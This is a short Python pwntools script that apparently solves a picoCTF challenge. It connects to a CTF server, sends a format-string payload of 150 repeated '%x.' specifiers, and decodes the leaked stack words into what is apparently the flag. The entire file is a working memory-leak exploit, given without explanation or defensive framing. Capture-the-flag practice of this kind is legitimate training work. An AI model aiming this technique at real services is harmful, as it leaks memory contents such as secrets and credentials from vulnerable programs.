from pwn import *

host = "mercury.picoctf.net"
port = 6989
exploit = b'%x.' * 150

conn = remote(host,port)
conn.recvrepeat(timeout=1)
conn.sendline(b'1')
conn.recvrepeat(timeout=1)
conn.sendline(exploit)

res = conn.recvrepeat(timeout=1).split(b'.')[14:24]

for r in res:
  try:
    print(bytes.fromhex(r.decode()).decode('ascii')[::-1],end='')
  except:
    print(chr(bytes.fromhex(r.decode())[3]))
    continue